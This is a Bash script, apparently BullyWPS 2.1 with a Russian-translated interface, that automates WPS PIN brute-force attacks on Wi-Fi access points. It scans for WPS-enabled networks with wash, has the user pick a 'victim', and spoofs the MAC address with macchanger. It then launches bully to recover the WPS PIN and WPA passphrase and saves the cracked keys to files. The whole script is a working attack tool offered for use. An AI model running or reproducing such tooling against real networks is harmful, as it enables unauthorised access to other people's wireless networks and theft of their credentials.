#!/bin/bash 


# Global Variables
SCRIPT="BullyWPS"
VERSION="2.1"
KEYS="$HOME/$SCRIPT/KEYS"
TMP="/tmp/$SCRIPT"
WPSPIN="pinWPS" 


# Check if the interface is connected to internet
CheckETH() {
clear
if [ "$(ip route|grep default)" != "" ]; then
  ETH=$(ip route|awk '/default/ {print $5}')
  HW_WIFI=$(ifconfig $WIFI|awk '/HW/ {print $5}'|cut -d- -f1,2,3,4,5,6)
  HW_ETH=$(ifconfig $ETH|awk '/HW/ {print $5}'|tr ':' '-')
  if [ "$HW_ETH" = "$HW_WIFI" ];then
    echo
    echo "[0;31mЧтобы избежать ошибок на интерфейсе \"$ETH\" убедитесь, что отключены от интернета! [0m"
    echo ""
    echo "Нажмите enter для возврата в меню."
    read junk
    menu
  fi
fi
}

# Function to select the target to attack
SeleccionarObjetivo() {
i=0
redesWPS=0
while read BSSID Channel RSSI WPSVersion WPSLocked ESSID;do
  longueur=${#BSSID}
  if [ $longueur -eq 17 ] ; then
    i=$(($i+1))
    WPSbssid[$i]=$BSSID
    WPSchanel[$i]=$Channel
    WPSessid[$i]=$ESSID
    PWR[$i]=$RSSI
  fi
  redesWPS=$i
done < $TMP/wash_capture.$$
if  [ "$redesWPS" = "0" ];then
  clear
  echo ""
  echo ""
  echo "                        * * *     В Н И М А Н И Е   * * *                "
  echo ""
  echo "                          Not found any RED "
  echo "                          Включен захват WPS"
  echo ""
  echo "                          [1;33mНажмите ENTER для возврата в меню!"
  read junk
  menu
else
  clear
  echo ""
  echo "                [1;32mТочки доступа уязвимые для атаки с BullyWPS[0m"
  echo ""
  echo "            MAC            SUPPORTED?      PWR      Канал        ESSID"
  echo ""
  countWPS=0
  while [ 1 -le $i ]; do
    countWPS=$(($countWPS+1))
    ESSID=${WPSessid[$countWPS]}
    BSSID=${WPSbssid[$countWPS]}
    PWR=${PWR[$countWPS]}
    Chanel=${WPSchanel[$countWPS]}
    echo " $countWPS)  $BSSID         $SOPORTADA          $PWR         $Chanel         $ESSID"
    i=$(($i-1))
  done   
  i=$redesWPS
  echo ""
  echo " 0)  Возврат в меню " 
  echo ""
  echo ""
  echo " --> [1;36mSelect a network[0m"
  read WPSoption
  set -- ${WPSoption}

  if [ $WPSoption -le $redesWPS ]; then
    if [ "$WPSoption" = "0" ];then
      menu
    fi
    ESSID=${WPSessid[$WPSoption]}
    BSSID=${WPSbssid[$WPSoption]}
    CHANEL=${WPSchanel[$WPSoption]}
    clear
  else
    echo " Выбор не верен ... выберите заново"
    sleep 2
    SeleccionarObjetivo
  fi
fi
ShowWPA="OFF"
InfoAP="ON"
menu
}

# Ищем WPS сети с помощью Wash
WashScan() {
if [ "$WIFI" = "" ]; then auto_select_monitor && WashScan; fi
CheckETH
xterm -icon -e wash -i $WIFI -C -o $TMP/wash_capture.$$ & 
WashPID=$!
sec_rem=30 
sleep 30 && kill $WashPID &>/dev/null &
while true; do
let sec_rem=$sec_rem-1
        interval=$sec_rem
        seconds=`expr $interval % 60`
        interval=`expr $interval - $seconds`
  sleep 1
  clear
  echo "[1;33mИщем цели... [1;36m$seconds[0m [1;33mseconds[0m"
  echo ""
  cat $TMP/wash_capture.$$
  if [ ! -e /proc/$WashPID ]; then
    sleep 1
    break
  fi
done
SeleccionarObjetivo
}

auto_select_monitor() {
#! /bin/bash

#Переводим карту в режим monitor mode автоматически

clear
t=0
if [ "$WIFI" = "" ]; then
> $TEMP/wireless.txt
cards=`airmon-ng|cut -d ' ' -f 1 | awk {'print $1'} |grep -v Interface #|grep -v  mon   `
echo $cards >> $TEMP/wireless.txt
tarj1=`cat $TEMP/wireless.txt | cut -d  ' ' -f 1  | awk  '{print $1}'`
tarj2=`cat $TEMP/wireless.txt | cut -d  ' ' -f 2  | awk  '{print $1}'`
rm  -rf $TEMP/wireless.txt

if  [ "$tarj1" = "" ]; then
clear
echo "                  * * *     В Н И М А Н И Е   * * *                "
echo ""
echo "    Не найденно ни одной WiFi карточки на этом компьютере"
echo ""
echo "    Нажмите ENTER для возврата в меню"
read yn
menu
fi

if [ "$tarj1" = "$tarj2" ]; then
tarj2=""
fi

tarjselec=$tarj1

if [ "$tarj2" != "" ] ;then
echo
echo
echo "      Следующие WiFi карты найденны на компьютере"
echo

airmon-ng |awk 'BEGIN { print "Карта  Чип              Драйвер\n------- ------------------ ----------" } \
  { printf "%-8s %-8s %-1s %10s\n", $1, $2, $3, $4 | "sort -r"}' |grep -v Interface  |grep -v Chipset

echo "      Выберите одну из карт"
echo

tarj_wire=""
tarjselec=""
function selectarj {
select tarjselec in `airmon-ng | awk {'print $1 | "sort -r"'} |grep -v Interface |grep -v Chipset  `; do
break;
done

if [ "$tarjselec" = "" ]; then
echo "  Выбранные опции неверны."
echo "  Выберите верные опции..."
selectarj
fi
}

if [ "$tarjselec" = "" ]; then
selectarj
fi

echo ""
echo "Выбранный интерфейс: $tarjselec"

fi
else
echo 
fi
tarjmonitor=${tarjselec:0:3}
if [ "$tarjmonitor" != "mon" ] && [ "$WIFI" = "" ];then
echo ""
echo ""
echo "                    Переводим карту в режим monitor mode..."
echo "" 
sleep 1

#clean interface

ifconfig $tarjselec down >/dev/null
ifconfig $tarjselec up >/dev/null
        ifconfig $tarjselec down
        ifconfig $tarjselec hw ether 00:11:22:33:44:55
        ifconfig $tarjselec up

airmon-ng start $tarjselec >/dev/null
cards=`airmon-ng|cut -d ' ' -f 1 |awk {'print $1 | "sort -d"'} |grep -v Interface |grep -v wlan`
largo=${#cards}
final=$(($largo-4))
WIFI=${cards:final}
echo  " $WIFI ----> Monitor mode включен."
sleep 2

else 
if [ "$WIFI" = "" ];then
WIFI="$tarjselec"

echo "" 
echo  " $WIFI ----> Monitor mode уже включен."
sleep 2
fi
fi
clear

# Spoof Mac Address and put card into monitor mode
echo -e "Хотите сменить MAC адрес вашей WiFi карты? y/n"
 
read b
if [[ $b == "Y" || $b == "y" || $b = "" ]]; then
        wmac=00:11:22:33:44:55
        echo
        ifconfig $WIFI down
        macchanger -m 00:11:22:33:44:55 $WIFI
        ifconfig $WIFI up
        echo
        echo
        sleep 3
        else
echo "    Нажмите enter для продолжения."
read c
if [[ $c == "N" || $c == "n" || $c = "" ]]; then
        ifconfig $tarjselec down
        macchanger -p $tarjselec
        ifconfig $tarjselec up
        tput setaf 1; echo "продолжить без смены MAC"
        echo
        echo
        echo
        sleep 2
fi
fi
}  

function ObtenerWPA_con_pin_o_no {
read -p "Ввести PIN вручную? Y/n :" x y

if [[ $x == "Y" || $x == "y" || $x = "" ]]; then
 read -p "pinWPS: " XWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $XWPSPIN -F -B -l 100 -v 3 &
 bullyPID=$!
# If "Control + C" is pressed, the process stops Bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Атакуем " $BSSID---$ESSID " на канале " $CHANEL " удачного взлома!"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен in \"$KEYS/$WPA_TXT\"[0m"
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else
echo "    Нажмите enter для продолжения."
if [[ $y == "N" || $y == "n" || $y = "" ]]; then
read y
# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -F -l 100 -v 3 &
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Атакуем " $BSSID---$ESSID " на канале " $CHANEL " удачного взлома!"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен в \"$KEYS/$WPA_TXT\"[0m"
echo "" 
sleep 3
echo ""
echo "    Нажмите enter для продолжения."
read junk
menu
fi
fi
fi
fi
}

function ObtenerWPA {
read -p "Ввести PIN вручную? Y/n :" y

if [[ $y == "Y" || $y == "y" || $y = "" ]]; then
read -p "pinWPS: " yWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $yWPSPIN -F -B -v 3 &
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Атакуем " $BSSID---$ESSID " на канале " $CHANEL " удачного взлома!"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен в \"$KEYS/$WPA_TXT\"[0m"
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else
echo "    Нажмите Enter для продолжения."
if [[ $e == "N" || $e == "n" || $e = "" ]]; then
read e
# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID --force -B -v 3 &
 bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Атакуем " $BSSID---$ESSID " на канале " $CHANEL " удачного взлома!"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен в \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "Нажмите enter для возврата в меню"
read junk
menu
fi
fi
fi
fi
}

function Primer_pin {
read -p "YВвести PIN вручную? Y/n :" d

if [[ $d == "Y" || $d == "y" || $d = "" ]]; then
read -p "pinWPS: " dWPSPIN
 echo ""
 echo ""
 echo ""
CheckETH
xterm -hold -geometry 65x30-1-1 -e bully  $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $dWPSPIN -F -B -v 3  & 
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Атакуем " $BSSID---$ESSID " на канале " $CHANEL " удачного взлома!"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "Ключ WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен in \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "    Нажмите enter для продолжения."
read junk
menu
fi
fi
fi
}

#Functional Bully Commands
function optional_functions {
#Set optional functions
bully #to show the options available in terminal
echo "[+] bully $WIFI -b $BSSID -c $CHANEL -e $ESSID"
echo "[+] Enter other functions bully to attack with ex-A-C-D, etc. with spaces"
read bullyVars
#Start
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars & 
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Starting bully (bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars)"
echo "[+] Attacking " $BSSID---$ESSID "on channel " $CHANEL " Good Luck and Happy Hacking"
  echo "[1;33mПолучаем WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "Key WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mКлюч был сохранен in \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo ""
echo "Нажмите enter для возврата в меню."
read junk
menu
fi
fi
}

#Function update Bully
function bully_update {
echo "   "
echo "          [1;32mЭто автоматический установщик обновлений для bully[0m"
echo ""
echo "        [1;36m[Необходим интернет для скачивания пакетов bully][0m"
echo ""
sleep 1
echo "Процедура скачивания последней версии."
sleep 3

# Download the latest Revision with svn
cd /tmp
echo "[1;32m"
svn co http://bully.googlecode.com/svn/trunk/src/ /tmp/bully-read-only && \
echo [0m
cd /tmp/bully-read-only
clear
sleep 2

# Version identification
if [ ! -d ".svn/" ]
then
	echo "0"
	exit ;
fi

REVISION="`svnversion 2> /dev/null | sed 's/[^0-9]*//g'`"

if [ x$REVISION = "x" ]
then
	REVISION="`svn info 2> /dev/null | grep -i revision | sed
's/[^0-9]*//g'`"
fi

if [ x$REVISION = "x" ]
then
	if [ -f ".svn/entries" ]
	then
		REVISION="`cat .svn/entries | grep -i revision | head -n 1 | sed
's/[^0-9]*//g'`"
	fi
fi

if [ x$REVISION = "x" ]
then
	REVISION="-1"
fi

# We report the version
echo ""
echo ""
echo "                      [1;33m<<[0m Версия пакета-[1;32m$REVISION
[1;33m>>[0m"
sleep 3

# Compile
echo ""
echo ""
echo "[1;33mSe Процедура комплирования пакетов ..."
sleep 3
echo "[1;36m"
make  && \
echo "[0m"
clear
sleep 3

# Installed in system
echo ""
echo ""
echo "[1;35mПроцедура установки пакетов в систему..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Limpiamos
echo ""
echo ""
echo "[1;36mЧищу временные файлы.."
echo ""
sleep 3
rm -Rf /tmp/bully-read-only/trunk/src/ &> /dev/null
rm -Rf $DESTDIR &> /dev/null
sleep 2

# We report the completion of the process
echo ""
echo ""
echo "[1;33mВсе задачи были выполненны! "
echo ""
echo ""
sleep 3
wait

# Press ENTER to return to menu

echo ""
echo "Нажмите enter для возврата в меню."
read yn
menu
}
#Function update macchanger
function macchanger_update {
echo "   "
echo "          [1;32mЭто автоматический установщик обновлений для macchanger[0m"
echo ""
echo "        [1;36m[Необходим интернет для скачивания пакетов macchanger][0m"
echo ""
sleep 1
echo "Процедура скачивания последней версии. "
sleep 3

# Download the latest Revision with svn
cd /tmp
echo "[1;32m"
git clone http://github.com/alobbs/macchanger/ /tmp/macchanger && \
echo [0m
cd /tmp/macchanger
clear
sleep 2
# Cmpile
echo ""
echo ""
echo "[1;33mSe Процедура комплирования пакетов ..."
sleep 3
echo "[1;36m"
bash autogen.sh
echo "[0m"
sleep 3
make  && \
echo "[0m"
clear
sleep 3

# Installed in system
echo ""
echo ""
echo "[1;35mПроцедура установки пакетов в систему..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Clean
echo ""
echo ""
echo "[1;36mЧищу временные файлы.."
echo ""
sleep 3
rm -Rf /tmp/macchanger/ &> /dev/null
sleep 2

# We report the completion of the process
echo ""
echo ""
echo "[1;33mВсе процессы были выполненны! "
echo ""
echo ""
sleep 3
wait

# Press ENTER to return to menu

echo ""
    echo "Нажмите enter для возврата в меню."
read yn
menu
}

#Function card unmount and exit
function DESMONTAR_tarj_y_salir {
if [ "$WIFI" != "" ]; then
clear
echo ""
  echo ""
  echo ""
  echo "	[1;33m####################################################################"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###     ¿ Извлечь карту после выхода?                            ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###        (n) Нет  -> Выйти без извлечения                      ###"
  echo "	[1;33m###        (m) Меню -> Обратно в главное меню                    ###"
  echo "	[1;33m###        ENTER    -> Извлечь и выйти                           ###"
  echo "	[1;33m###       (r)+ENTER -> Восстановит оригинальный MAC              ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m####################################################################"
  echo ""
  echo ""
read salida
set -- ${salida}

if [ "$salida" = "r" ]; then
ifconfig $tarjselec down
macchanger -p $tarjselec
ifconfig $tarjselec up
fi
if [ "$salida" = "m" ]; then
menu
fi
if [ "$salida" = "n" ]; then
  echo ""
echo "         Ждите."
sleep 2
clear 
exit
fi
echo "$WIFI карта была успешно извлечена!"
airmon-ng stop $WIFI >/dev/null
fi
  echo ""
echo "         Ждите."
sleep 2
clear
 exit

}

menu() {
# Welcome
echo " #########################################################################################"
echo " #                                                                                       #"
echo " #    ~ Скрипт автоматической атаки на WPS с помощью Bully написан @cristi_28            #"
echo " #    ~ Перевод на русский: 5maks5 [ forum.antichat.ru/member.php?u=136564 ]             #"
echo " #    ~ Раздел беспроводные технологии: [ forum.antichat.ru/forum113.html ]              #"
echo " #    ~ Сайт автора: [ http://lampiweb.com ]; Поддержка: Kali,WifiSlax                   #"
echo " #    ~ Версия: 2.1 (перевод 19.07.14) зависимости: BullyWPS $VERSION                         #"
echo " #                                                                                       #"
echo " #                                                                                       #"
echo " #########################################################################################"
sleep 1
echo "---------------------------------------"
if [ "$InfoAP" = "ON" ]; then
  echo "Информация:"
  echo ""
  echo "              ESSID = $ESSID"
  echo "              Канал = $CHANEL"
  echo "         MAC AP = $BSSID"
  fi
  if [ "$ShowWPA" = "ON" ]; then
  echo "          WPA Key = $WPA_KEY"
  fi
  echo "---------------------------------------"
echo ""
echo " 1) Поиск точек с включенным WPS"
echo ""
echo " 2) Выбрать другую жертву"
echo ""
echo " 3) Подбор WPA с Bully"
echo ""
echo " 4) Подбор WPA без проверки калькулятора " 
echo ""
echo " 5) Добавить комманды Bully ( пр: -N -Z , итд. ) "
echo ""
echo " 6) Добавить первые 4 цифры + xxxx"
echo ""
echo " 7) Обновить Bully"
echo ""
echo " 8) Обновить MACChanger"
echo ""
echo " 0) Выход"
echo ""
read -p " #> " CHOISE
echo ""
case $CHOISE in
  1 ) WashScan;;
  2 ) SeleccionarObjetivo;;
  3 ) ObtenerWPA_con_pin_o_no;;
  4 ) ObtenerWPA;;
  5 ) optional_functions;;
  6 ) Primer_pin;;
  7 ) bully_update;;
  8 ) macchanger_update;;
  0 ) DESMONTAR_tarj_y_salir;;
  * ) echo "Неверно выбранный пункт!"; menu;;
esac
}

# User check
if [ "$(whoami)" != "root" ]; then
 echo -e '\e[1;31m


    ¡¡¡ Запуск возможен только от root !!!

        Проверка: sudo $0

\e[0m' 

 exit 1
fi

# Create directories if they do not exist 
if [ ! -d $TMP ]; then mkdir -p $TMP; else rm -rf $TMP/*; fi
if [ ! -d $KEYS ]; then mkdir -p $KEYS; fi
if [ -d $HOME/Desktop/Wireless-Keys ]; then
  if [ ! -d $HOME/Desktop/Wireless-Keys/$SCRIPT-keys ]; then
    ln -s $KEYS $HOME/Desktop/Wireless-Keys/$SCRIPT-keys
  fi
fi

# Eliminating interfaces in monitor
interfaces=$(ifconfig|awk '/^mon/ {print $1}')
if [ "$interfaces" != "" ]; then
  for monx in $interfaces; do
    airmon-ng stop $monx up >/dev/null 2>&1
  done
fi

menu
